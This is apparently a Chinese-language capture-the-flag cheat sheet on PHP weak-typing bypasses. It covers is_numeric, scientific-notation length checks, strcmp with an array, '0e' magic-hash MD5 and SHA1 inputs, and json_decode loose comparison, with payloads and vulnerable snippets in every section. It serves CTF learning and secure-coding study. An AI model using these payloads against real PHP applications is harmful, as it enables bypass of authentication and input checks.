* [isNumber](#isNumber)
* [数字长度绕过](#数字长度绕过)
* [strcmp](#strcmp)
* [md5](#md5)
* [json_decode](#json_decode)
#isNumber
is_numeric()判断是否为数字，因为PHP的弱类型，将数字后面加上空格或者任意一个字符即可绕过.
payload:
```
数字%20
p2=2%20
```
#数字长度绕过
通过科学计数法绕过
payload:
```
$_GET['p1'] > 99999999 && strlen($_GET['p1']) < 9
p1=1e9
```
#strcmp
strcmp函数比较字符串的本质是将两个变量转换为ascii，然后进行减法运算，然后根据运算结果来决定返回值.
语法：strcmp(string1,string2);
0 - 如果两个字符串相等。当传入的数据类型不是字符串是，报错，并且返回0；

<0 - 如果 string1 小于 string2

>0 - 如果 string1 大于 string2
payload：
```
  if (strcmp($_GET['flag'], FLAG) == 0) 
  flag=[]
```
#md5
PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0
payload:
```
QNKCDZO
    240610708
    s878926199a
    s155964671a
    s214587387a
    s214587387a
     sha1(str)
    sha1('aaroZmOk')  
    sha1('aaK1STfY')
    sha1('aaO8zKZF')
    sha1('aa3OFF9m')
```
#json_decode
输入一个json类型的字符串，json_decode函数解密成一个数组，判断数组中key的值是否等于key的值。虽然key的值我们不知道，但是可以利用0=="string"这种形式绕过
payload:
```
define('key', 'flag{4}');
if (isset($_POST['a'])) {
    $a = json_decode($_POST['a']);
    if ($a->key == $key) {
        echo "flag" . key;
    } else {
        echo "不相等";
    }
 } else{
     echo "a不存在";
 }
a={"key":0}
```
